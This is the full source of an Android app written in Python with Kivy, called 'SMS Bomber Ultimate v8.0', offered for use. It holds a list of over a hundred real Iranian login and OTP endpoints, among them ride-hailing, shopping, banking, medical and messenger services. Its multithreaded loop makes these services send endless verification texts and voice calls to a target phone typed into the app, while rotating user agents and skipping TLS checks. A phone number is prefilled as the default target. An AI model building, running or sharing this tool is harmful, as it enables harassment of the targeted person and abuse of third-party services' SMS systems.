# -*- coding: utf-8 -*-
"""
SMS Bomber Ultimate v8.0 - Android Edition
Designed by Cartel | @RealAHMSHOP
"""
import threading, requests, json, time, random, os, sys
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import urllib3; urllib3.disable_warnings()
from kivy.config import Config
Config.set('kivy', 'log_level', 'error')
from kivy.app import App
from kivy.uix.screenmanager import ScreenManager, Screen
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.textinput import TextInput
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.spinner import Spinner
from kivy.uix.scrollview import ScrollView
from kivy.uix.popup import Popup
from kivy.clock import Clock
from kivy.metrics import dp, sp
from kivy.core.window import Window
from kivy.utils import platform

UAS = [
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/120.0.6099.230 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S24) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
]

APIS = []
def add(n,t,u,p=None,m="POST"):
    APIS.append([n,t,m,u,p])

add("دیوار", "sms", "https://api.divar.ir/v5/auth/authenticate", '{"phone":"0{phone}"}')
add("نوبت ایران", "sms", "https://nobat.ir/api/public/patient/login/phone", '--WebKit\r\nContent-Disposition: form-data; name="mobile"\r\n\r\n0{phone}\r\n--WebKit--')
add("الوپیک(ورود)", "sms", "https://api.alopeyk.com/api/v2/login?platform=pwa", '{"type":"CUSTOMER","phone":"0{phone}"}')
add("الوپیک(ثبت نام)", "sms", "https://api.alopeyk.com/api/v2/register-customer?platform=pwa", '{"type":"CUSTOMER","phone":"0{phone}","firstname":"test","lastname":"test"}')
add("اسنپ تاکسی", "sms", "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", '{"cellphone":"+98{phone}"}')
add("اسنپ اکسپرس", "sms", "https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass", 'cellphone=0{phone}&captcha=')
add("تپسی(راننده)", "sms", "https://api.tapsi.ir/api/v2.2/user", '{"credential":{"phoneNumber":"0{phone}","role":"DRIVER"},"otpOption":"SMS"}')
add("تپسی(مسافر)", "sms", "https://api.tapsi.ir/api/v2.2/user", '{"credential":{"phoneNumber":"0{phone}","role":"PASSENGER"},"otpOption":"SMS"}')
add("دیجی‌کالا جت", "sms", "https://api.digikalajet.ir/user/login-register/", '{"phone":"0{phone}"}')
add("ازکی", "sms", "https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/", '{"phoneNumber":"0{phone}"}')
add("دکتر دکتر", "sms", "https://drdr.ir/api/v3/auth/login/mobile/init", '{"mobile":"0{phone}"}')
add("طاقچه", "sms", "https://gw.taaghche.com/v4/site/auth/login", '{"contact":"0{phone}","forceOtp":false}')
add("کمدا", "sms", "https://api.komodaa.com/api/v2.6/loginRC/request", '{"phone_number":"0{phone}"}')
add("تترلند", "sms", "https://service.tetherland.com/api/v5/login-register", '{"mobile":"0{phone}"}')
add("علی بابا", "sms", "https://ws.alibaba.ir/api/v3/account/mobile/otp", '{"phoneNumber":"0{phone}"}')
add("موبیت", "sms", "https://api.mobit.ir/api/web/v8/register/register", '{"number":"0{phone}"}')
add("بانی‌مد", "sms", "https://mobapi.banimode.com/api/v2/auth/request", '{"phone":"0{phone}"}')
add("قبضینو", "sms", "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode", '{"Parameters":{"MobileNumber":"0{phone}"}}')
add("گپ(sms)", "sms", "https://core.gap.im/v1/user/add.json?mobile=%2B98{phone}", None, "GET")
add("ترب", "sms", "https://api.torob.com/a/phone/send-pin/?phone_number=0{phone}", None, "GET")
add("لندو", "sms", "https://api.lendo.ir/api/customer/auth/send-otp", '{"mobile":"0{phone}"}')
add("بوسکول", "sms", "https://www.buskool.com/send_verification_code", '{"phone":"0{phone}"}')
add("آی‌تول", "sms", "https://app.itoll.ir/api/v1/auth/login", '{"mobile":"0{phone}"}')
add("تلوبیون", "sms", "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one", '{"code":"98","phone":"{phone}","smsStatus":"default"}')
add("کاروپکس", "sms", "https://caropex.com/api/v1/user/login", '{"mobile":"0{phone}"}')
add("باسلام", "sms", "https://auth.basalam.com/otp-request", '{"mobile":"0{phone}"}')
add("تامین‌پیشرو", "sms", "https://www.tamimpishro.com/site/api/v1/user/otp", '{"mobile":"0{phone}"}')
add("خانومی", "sms", "https://www.khanoumi.com/accounts/sendotp", '{"mobile":"0{phone}","redirectUrl":""}')
add("دالفک", "sms", "https://www.dalfak.com/api/auth/sendVerificationCode", '{"type":1,"value":"0{phone}"}')
add("فیلم‌نت", "sms", "https://filmnet.ir/api-v2/access-token/users/0{phone}/otp", '{}')
add("نمایوا", "sms", "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", '{"UserName":"+98{phone}"}')
add("اسنپ اپس", "sms", "https://api.snapp.ir/api/v1/sms/link", '{"phone":"0{phone}"}')
add("دکترتو", "sms", "https://api.doctoreto.com/api/web/patient/v1/accounts/register", '{"country_id":205,"mobile":"{phone}"}')
add("اکالا", "sms", "https://api-react.okala.com/C/CustomerAccount/OTPRegister", '{"mobile":"0{phone}","deviceTypeCode":0,"confirmTerms":"true","notRobot":"false"}')
add("دیجی‌کالا", "sms", "https://api.digikala.com/v1/user/authenticate/", '{"backUrl":"/","username":"0{phone}","otp_call":"false"}')
add("نوبیتکس", "sms", "https://api.nobitex.ir/auth/otp", '{"phone":"0{phone}"}')
add("3tex", "sms", "https://3tex.io/api/1/users/validation/mobile", '{"receptorPhone":"0{phone}"}')
add("دنیز شاپ", "sms", "https://deniizshop.com/api/v1/sessions/login_request", '{"mobile_phone":"0{phone}"}')
add("فلایت‌آیو", "sms", "https://flightio.com/bff/Authentication/CheckUserKey", '{"userKey":"0{phone}"}')
add("بهترینو", "sms", "https://bck.behtarino.com/api/v1/users/phone_verification/", '{"phone":"0{phone}"}')
add("آبان تتر", "sms", "https://abantether.com/users/register/phone/send/", '{"phoneNumber":"0{phone}"}')
add("پولینو", "sms", "https://api.pooleno.ir/v1/auth/check-mobile", '{"mobile":"0{phone}"}')
add("بیت‌بارگ", "sms", "https://api.bitbarg.com/api/v1/authentication/registerOrLogin", '{"phone":"0{phone}"}')
add("بهرام شاپ", "sms", "https://api.bahramshop.ir/api/user/validate/username", '{"username":"0{phone}"}')
add("بیت‌پین", "sms", "https://api.bitpin.ir/v1/usr/sub_phone/", '{}')
add("چمدون", "sms", "https://chamedoon.com/api/v1/membership/guest/request_mobile_verification", '{"mobile":"0{phone}"}')
add("کیلیـد", "sms", "https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start", '{"mobile":"0{phone}"}')
add("پینکت", "sms", "https://pinket.com/api/cu/v2/phone-verification", '{"phoneNumber":"0{phone}"}')
add("اتاقک", "sms", "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode", '{"userName":"0{phone}"}')
add("شب", "sms", "https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile", '{"mobile":"0{phone}"}')
add("بیت 24", "sms", "https://bit24.cash/app/api/auth/check-mobile", '{"mobile":"0{phone}"}')
add("ریبیت", "sms", "https://api.raybit.net:3111/api/v1/authentication/register/mobile", '{"mobile":"0{phone}"}')
add("پوبیشا", "sms", "https://www.pubisha.com/login/checkCustomerActivation", '{"mobile":"0{phone}"}')
add("شیپور", "sms", "https://www.sheypoor.com/auth", '{"username":"0{phone}"}')
add("آ4باز", "sms", "https://a4baz.com/api/web/login", '{"cellphone":"0{phone}"}')
add("آنارگیفت", "sms", "https://api.anargift.com/api/people/auth", '{"user":"0{phone}"}')
add("سیم خان", "sms", "https://www.simkhanapi.ir/api/users/registerV2", '{"mobileNumber":"0{phone}"}')
add("هایپرژان", "sms", "https://shop.hyperjan.ir/api/users/manage", '{"mobile":"0{phone}"}')
add("هی ورد", "sms", "https://hiword.ir/wp-json/otp-login/v1/login", '{"identifier":"0{phone}"}')
add("دیکاردو", "sms", "https://dicardo.com/main/sendsms", '{"phone":"0{phone}"}')
add("قاصدک 24", "sms", "https://ghasedak24.com/user/ajax_register", '{"username":"0{phone}"}')
add("تیک بان", "sms", "https://tikban.com/Account/LoginAndRegister", '{"CellPhone":"0{phone}"}')
add("ایران کتاب", "sms", "https://www.iranketab.ir/account/register", '{"UserName":"0{phone}"}')
add("کتابچی", "sms", "https://ketabchi.com/api/v1/auth/requestVerificationCode", '{"phoneNumber":"0{phone}"}')
add("آف دکور", "sms", "https://www.offdecor.com/index.php?route=account/login/sendCode", '{"phone":"0{phone}"}')
add("اکسیر", "sms", "https://exo.ir/index.php?route=account/mobile_login", '{"mobile_number":"0{phone}"}')
add("شهر فرش", "sms", "https://shahrfarsh.com/Account/Login", 'phoneNumber=0{phone}')
add("تاک فرش", "sms", "https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php", '{"phone_email":"0{phone}"}')
add("روخا شاپ", "sms", "https://rojashop.com/api/auth/sendOtp", '{"mobile":"0{phone}"}')
add("دادپرداز", "sms", "https://dadpardaz.com/advice/getLoginConfirmationCode", '{"mobile":"0{phone}"}')
add("رکلا", "sms", "https://api.rokla.ir/api/request/otp", '{"mobile":"0{phone}"}')
add("خودرو45", "sms", "https://khodro45.com/api/v1/customers/otp/", '{"mobile":"0{phone}"}')
add("ماشین بانک", "sms", "https://mashinbank.com/api2/users/check", '{"mobileNumber":"0{phone}"}')
add("پزشکت", "sms", "https://api.pezeshket.com/core/v1/auth/requestCode", '{"mobileNumber":"0{phone}"}')
add("ویرگول", "sms", "https://virgool.io/api/v1.4/auth/verify", '{"method":"phone","identifier":"0{phone}"}')
add("تیمچه", "sms", "https://api.timcheh.com/auth/otp/send", '{"mobile":"0{phone}"}')
add("پاکلین", "sms", "https://client.api.paklean.com/user/resendCode", '{"username":"0{phone}"}')
add("موبوگیفت", "sms", "https://mobogift.com/signin", '{"username":"0{phone}"}')
add("ایران کارت", "sms", "https://api.iranicard.ir/api/v1/register", '{"mobile":"0{phone}"}')
add("تی‌جی هشت", "sms", "https://tj8.ir/auth/register", '{"mobile":"0{phone}"}')
add("سینما تیکت", "sms", "https://cinematicket.org/api/v1/users/signup", '{"phone_number":"0{phone}"}')
add("ایران تیک", "sms", "https://www.irantic.com/api/login/request", '{"mobile":"0{phone}"}')
add("کافه قیمت", "sms", "https://kafegheymat.com/shop/getLoginSms", '{"phone":"0{phone}"}')
add("دلی نو", "sms", "https://www.delino.com/user/register", '{"mobile":"0{phone}"}')
add("تمرلند", "sms", "https://1401api.tamland.ir/api/user/signup", '{"Mobile":"0{phone}"}')
add("ملیکس شاپ", "sms", "https://melix.shop/site/api/v1/user/otp", '{"mobile":"0{phone}"}')
add("سفیران", "sms", "https://safiran.shop/login", '{"mobile":"0{phone}"}')
add("گارسون", "sms", "https://garcon.tandori.ir/users/v1/main/login", '{"phone":"0{phone}"}')
add("دستخط", "sms", "https://dastkhat-isad.ir/api/v1/user/store", '{"mobile":"0{phone}"}')
add("iRWCo", "sms", "https://irwco.ir/register", '{"mobile":"0{phone}"}')
add("سیب بانک", "sms", "https://api.sibbank.ir/v1/auth/login", '{"phone_number":"0{phone}"}')
add("ارشیان", "sms", "https://api.arshiyan.com/send_code", '{"country_code":"98","phone_number":"{phone}"}')
add("تاپ نور", "sms", "https://backend.topnoor.ir/web/v1/user/otp", '{"mobile":"0{phone}"}')
add("آلینانس", "sms", "https://api.alinance.com/user/register/mobile/send/", '{"phone_number":"0{phone}"}')
add("دادحساب", "sms", "https://api.dadhesab.ir/user/entry", '{"username":"0{phone}"}')
add("دوسما", "sms", "https://app.dosma.ir/sendverify/", '{"username":"0{phone}"}')
add("اطمینان", "sms", "https://api.ehteraman.com/api/request/otp", '{"mobile":"0{phone}"}')
add("همراه اول", "sms", "https://api-ebcom.mci.ir/services/auth/v1.0/otp", '{"msisdn":"0{phone}"}')
add("HBBS", "sms", "https://api.hbbs.ir/authentication/SendCode", '{"MobileNumber":"0{phone}"}')
add("ایران املک", "sms", "https://api.iranamlaak.net/authenticate/send/otp/to/mobile/via/sms", '{"AgencyMobile":"0{phone}"}')
add("KCD", "sms", "https://api.kcd.app/api/v1/auth/login", '{"mobile":"0{phone}"}')
add("مزوکندل", "sms", "https://mazoocandle.ir/login", '{"phone":"0{phone}"}')
add("استادکار", "sms", "https://api.ostadkr.com/login", '{"mobile":"0{phone}"}')
add("پِیمیشه", "sms", "https://api.paymishe.com/api/v1/otp/registerOrLogin", '{"mobile":"0{phone}"}')
add("رای شمار", "sms", "https://api.rayshomar.ir/api/Register/RegistrMobile", '{"MobileNumber":"0{phone}"}')
add("رفعتا", "sms", "https://refahtea.ir/wp-admin/admin-ajax.php", '{"mobile":"0{phone}"}')
add("ممی فود", "sms", "https://mamifood.org/Registration.aspx/SendValidationCode", '{"Phone":"0{phone}"}')
add("یوفون", "sms", "https://server.uphone.ir/api/v1/login/otp/request", '{"mobile":"0{phone}"}')
add("گلیت", "sms", "https://www.glite.ir/wp-admin/admin-ajax.php", 'action=logini_first&login=0{phone}')
add("آف چ", "sms", "https://api.offch.com/auth/otp", '{"username":"0{phone}"}')
add("سیب بازار", "sms", "https://sandbox.sibbazar.com/api/v1/user/invite", '{"username":"0{phone}"}')
add("سبزیمان", "sms", "https://sabziman.com/wp-admin/admin-ajax.php", "action=newphoneexist&phonenumber=0{phone}")
add("واچ آنلاین", "sms", "https://api.watchonline.shop/api/v1/otp/request", '{"mobile":"0{phone}"}')
add("اسنپ تریپ", "sms", "https://www.snapptrip.com/register", '{"mobile_phone":"0{phone}","password":"pass123","country_code":"+98"}')
add("فیلم‌نت2", "sms", "https://api-v2.filmnet.ir/access-token/users/0{phone}/otp", '{}')
add("چارتکس", "sms", "https://api.chartex.net/api/v2/user/validate", '{"mobile":"0{phone}"}')
add("مای‌دیجی‌پی", "sms", "https://app.mydigipay.com/digipay/api/users/send-sms", '{"cellNumber":"0{phone}"}')
add("ویسگون", "sms", "https://gateway.wisgoon.com/api/v1/auth/login/", '{"phone":"0{phone}"}')
add("تگ ماند", "sms", "https://tagmond.com/phone_number", 'phone_number=0{phone}')
add("لیمومی", "sms", "https://my.limoome.com/api/auth/login/otp", '{"mobileNumber":"0{phone}","country":"1"}')
add("میهن پزشک", "sms", "https://www.mihanpezeshk.com/ConfirmCodeSbm_Patient", 'mobile=0{phone}&_token=bBSxMx7ifyp&recaptcha=')
add("فودسنتر", "sms", "https://www.foodcenter.ir/account/sabtmobile", 'mobile=0{phone}')
add("هومتیک", "sms", "https://auth.homtick.com/api/V1/User/GetVerifyCode", '{"mobileOrEmail":"0{phone}"}')
add("کاردون", "sms", "https://app.kardoon.ir:4433/api/users", '{"mobile":"0{phone}"}')
add("اینستاگرام", "sms", "https://www.instagram.com/accounts/account_recovery_send_ajax/", 'email_or_username=0{phone}')
add("رقام", "sms", "https://web.raghamapp.com/api/users/code", '{"phone":"0{phone}"}')
add("تریپ", "sms", "https://gateway.trip.ir/api/registers", '{"CellPhone":"0{phone}"}')
add("بایکس24", "sms", "https://bitex24.com/api/v1/auth/sendSms", '{"mobile":"0{phone}"}')
add("اسنپ مارکت", "sms", "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass", 'cellphone=0{phone}')
add("آربیلیت", "sms", "https://auth.mrbilit.com/api/login/exists/v2", '{"mobileOrEmail":"0{phone}"}')
add("شاد", "sms", "https://shadmessenger12.iranlms.ir/", '{"api_version":"3","method":"sendCode","data":{"phone_number":"98{phone}","send_type":"SMS"}}')
add("اسنپ فود", "sms", "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass", 'cellphone=0{phone}')
add("بیسفون", "sms", "https://bisphone.com/api/v1/auth/call-otp", '{"phone":"98{phone}"}')
add("آوا", "sms", "https://ava.ir/api/v1/auth/send-code", '{"phone":"98{phone}","channel":"voice"}')
add("روبیکا(تماس)", "call", "https://messengerg2c4.iranlms.ir/", '{"api_version":"3","method":"sendCode","data":{"phone_number":"98{phone}","send_type":"CALL"}}')
add("روبیکا(v2)", "call", "https://messengerg2c4.iranlms.ir/", '{"api_version":"3","method":"sendCode","data":{"phone_number":"98{phone}","send_type":"voice"}}')
add("روبیکا(v3)", "call", "https://messengerg2c1.iranlms.ir/", '{"api_version":"3","method":"sendCode","data":{"phone_number":"98{phone}","send_type":"voice"}}')
add("ایتا(تماس)", "call", "https://eitaa.com/api/sendCode", '{"phone":"98{phone}","send_type":"CALL"}')
add("ایتا(v2)", "call", "https://eitaa.com/api/auth/request_call", '{"phone":"98{phone}"}')
add("بله(تماس)", "call", "https://bale.ai/", '{"_v":"3","method":"sendCode","data":{"phone":"98{phone}","send_type":"CALL"}}')
add("گپ(تماس)", "call", "https://core.gap.im/v1/user/add.json?mobile=%2B98{phone}&type=call", None, "GET")
add("سروش(تماس)", "call", "https://sapp.iranlms.ir/", '{"api_version":"3","method":"sendCode","data":{"phone_number":"98{phone}","send_type":"voice"}}')
add("آی‌گپ(تماس)", "call", "https://api.igap.net/", '{"jsonrpc":"2.0","method":"auth.sendCode","params":{"phone":"98{phone}","send_type":"call"}}')
add("پاکلین(تماس)", "call", "https://client.api.paklean.com/user/resendVoiceCode", '{"username":"0{phone}"}')
add("ازکی(تماس)", "call", "https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber=0{phone}", None, "GET")
add("دیجی‌کالا(تماس)", "call", "https://api.digikala.com/v1/user/authenticate/", '{"backUrl":"/","username":"0{phone}","otp_call":"true"}')
add("شاد(تماس)", "call", "https://shadmessenger12.iranlms.ir/", '{"api_version":"3","method":"sendCode","data":{"phone_number":"98{phone}","send_type":"CALL"}}')

SM = [a for a in APIS if a[1]=="sms"]
CL = [a for a in APIS if a[1]=="call"]

class MainScreen(Screen):
    def __init__(self, **kw):
        super().__init__(**kw)
        self.running = False
        self.stats = {"sms":0,"call":0,"ok":0,"fail":0,"round":0}
        self.start_time = 0
        self.build_ui()
    
    def build_ui(self):
        main = BoxLayout(orientation='vertical', padding=[dp(15), dp(10)], spacing=dp(8))
        
        # Header
        header = BoxLayout(orientation='vertical', size_hint_y=0.1)
        lbl_title = Label(text="[b]SMS BOMBER v8.0[/b]", font_size=sp(20), markup=True, color=[1,0.13,0.27,1])
        lbl_sub = Label(text="Professional Testing Tool", font_size=sp(12), color=[0.5,0.5,0.7,1], size_hint_y=0.3)
        header.add_widget(lbl_title)
        header.add_widget(lbl_sub)
        main.add_widget(header)
        
        # Phone input
        phone_box = BoxLayout(orientation='vertical', size_hint_y=0.08, spacing=dp(3))
        phone_box.add_widget(Label(text="Target Phone", font_size=sp(11), color=[0.5,0.5,0.7,1], size_hint_y=0.3))
        self.phone_input = TextInput(text="09394205269", multiline=False, font_size=sp(18),
            background_color=[0.05,0.05,0.1,1], foreground_color=[0,1,0.53,1],
            cursor_color=[0,1,0.53,1], padding=[dp(10), dp(8)])
        phone_box.add_widget(self.phone_input)
        main.add_widget(phone_box)
        
        # Mode + Settings
        row = BoxLayout(orientation='horizontal', size_hint_y=0.08, spacing=dp(8))
        
        self.mode_spinner = Spinner(text="SMS+CALL", values=["SMS+CALL","SMS Only","CALL Only"],
            background_color=[0.07,0.07,0.15,1], color=[1,1,1,1], font_size=sp(13))
        row.add_widget(self.mode_spinner)
        
        self.thread_spinner = Spinner(text="50 Threads", values=["10","20","30","40","50","75","100"],
            background_color=[0.07,0.07,0.15,1], color=[1,1,1,1], font_size=sp(13))
        row.add_widget(self.thread_spinner)
        
        main.add_widget(row)
        
        # Buttons
        btn_row = BoxLayout(orientation='horizontal', size_hint_y=0.09, spacing=dp(10))
        self.start_btn = Button(text="LAUNCH", background_color=[1,0.13,0.27,1], color=[1,1,1,1],
            font_size=sp(15), bold=True)
        self.start_btn.bind(on_press=self.start_attack)
        btn_row.add_widget(self.start_btn)
        
        self.stop_btn = Button(text="STOP", background_color=[0.2,0.2,0.4,1], color=[1,1,1,1],
            font_size=sp(15), bold=True, disabled=True)
        self.stop_btn.bind(on_press=self.stop_attack)
        btn_row.add_widget(self.stop_btn)
        main.add_widget(btn_row)
        
        # Stats
        stats_grid = GridLayout(cols=3, size_hint_y=0.12, spacing=dp(5))
        self.stat_widgets = {}
        stat_items = [("sms","SMS","00ccff","📱"),("call","CALL","ff8800","📞"),
            ("ok","OK","00ff88","✅"),("fail","FAIL","ff4444","❌"),
            ("round","ROUND","aa88ff","🔄"),("time","TIME","ffdd44","⏱")]
        
        for key, label, color, emoji in stat_items:
            box = BoxLayout(orientation='vertical', padding=[dp(3), dp(2)])
            box.add_widget(Label(text=emoji, font_size=sp(18), size_hint_y=0.4))
            lbl_val = Label(text="0", font_size=sp(22), bold=True, color=self.hex_to_rgb(color))
            self.stat_widgets[key] = lbl_val
            box.add_widget(lbl_val)
            box.add_widget(Label(text=label, font_size=sp(9), color=[0.5,0.5,0.7,1], size_hint_y=0.2))
            stats_grid.add_widget(box)
        main.add_widget(stats_grid)
        
        # Info
        info = Label(text=f"APIs: {len(APIS)} | SMS: {len(SM)} | CALL: {len(CL)} | @RealAHMSHOP",
            font_size=sp(10), color=[0.4,0.4,0.6,1], size_hint_y=0.04)
        main.add_widget(info)
        
        # Log
        main.add_widget(Label(text="Log:", font_size=sp(10), color=[0.5,0.5,0.7,1], size_hint_y=0.02))
        sv = ScrollView(size_hint_y=0.35)
        self.log_text = TextInput(text="SMS Bomber Ultimate v8.0 loaded...\n", readonly=True, 
            font_size=sp(10), background_color=[0.02,0.02,0.06,1], foreground_color=[0,1,0.53,1])
        sv.add_widget(self.log_text)
        main.add_widget(sv)
        
        self.add_widget(main)
    
    def hex_to_rgb(self, h):
        h = h.lstrip('#')
        return [int(h[i:i+2],16)/255 for i in (0,2,4)] + [1]
    
    def lg(self, msg):
        old = self.log_text.text
        self.log_text.text = f"[{datetime.now().strftime('%H:%M:%S')}] {msg}\n" + old
        if self.log_text.text.count('\n') > 100:
            self.log_text.text = self.log_text.text[:5000]
    
    def start_attack(self, btn):
        p = self.phone_input.text.strip()
        if not p or not p.startswith("09") or len(p)!=11:
            self.lg("ERROR: Enter 11-digit phone!")
            return
        self.running = True
        self.start_btn.disabled = True
        self.stop_btn.disabled = False
        for k in self.stat_widgets:
            self.stat_widgets[k].text = "0"
        self.stats = {"sms":0,"call":0,"ok":0,"fail":0,"round":0}
        self.start_time = time.time()
        threading.Thread(target=self.worker, args=(p,), daemon=True).start()
        self.lg(f"Attack: {p}")
    
    def stop_attack(self, btn):
        self.running = False
        self.lg("STOPPED!")
        self.start_btn.disabled = False
        self.stop_btn.disabled = True
    
    def worker(self, phone):
        pn = phone[1:]
        mode = self.mode_spinner.text
        tgt = SM if mode=="SMS Only" else (CL if mode=="CALL Only" else APIS)
        threads = int(self.thread_spinner.text.split()[0])
        rn = 0
        while self.running:
            rn += 1
            self.stats["round"] = rn
            Clock.schedule_once(lambda dt: self.stat_widgets["round"].__setattr__("text", str(rn)))
            self.lg(f"Round #{rn} - {len(tgt)} targets")
            random.shuffle(tgt)
            with ThreadPoolExecutor(max_workers=threads) as ex:
                futs = [ex.submit(self.hit, pn, t) for t in tgt if self.running]
                for f in futs:
                    if not self.running: break
                    try: f.result()
                    except: pass
            elapsed = int(time.time()-self.start_time)
            Clock.schedule_once(lambda dt: self.stat_widgets["time"].__setattr__("text", f"{elapsed}s"))
            time.sleep(0.3)
        self.running = False
        Clock.schedule_once(lambda dt: setattr(self.start_btn, 'disabled', False))
        Clock.schedule_once(lambda dt: setattr(self.stop_btn, 'disabled', True))
        self.lg(f"Done! OK: {self.stats['ok']} FAIL: {self.stats['fail']}")
    
    def update_ui(self, key, val):
        Clock.schedule_once(lambda dt: self.stat_widgets[key].__setattr__("text", str(val)))
    
    def hit(self, pn, t):
        if not self.running: return
        try:
            h = {"User-Agent": random.choice(UAS), "Content-Type": "application/json"}
            d = t[4].replace("{phone}", pn) if t[4] and isinstance(t[4], str) else t[4]
            u = t[3].replace("{phone}", pn) if "{phone}" in t[3] and not t[4] else t[3]
            r = (requests.post if t[2]=="POST" else requests.get)(u, data=d, headers=h, timeout=5, verify=False)
            ok = r.status_code < 400
            if ok:
                self.stats["ok"]+=1; self.stats[t[1]]+=1
                self.update_ui("ok", self.stats["ok"])
                self.update_ui(t[1], self.stats[t[1]])
                self.lg(f"OK {t[1].upper()} {t[0]}: {r.status_code}")
            else:
                self.stats["fail"]+=1; self.update_ui("fail", self.stats["fail"])
                self.lg(f"FAIL {t[1].upper()} {t[0]}: {r.status_code}")
        except:
            self.stats["fail"]+=1; self.update_ui("fail", self.stats["fail"])

class BomberApp(App):
    def build(self):
        self.title = "SMS Bomber v8.0"
        sm = ScreenManager()
        sm.add_widget(MainScreen(name='main'))
        return sm

if __name__ == "__main__":
    BomberApp().run()
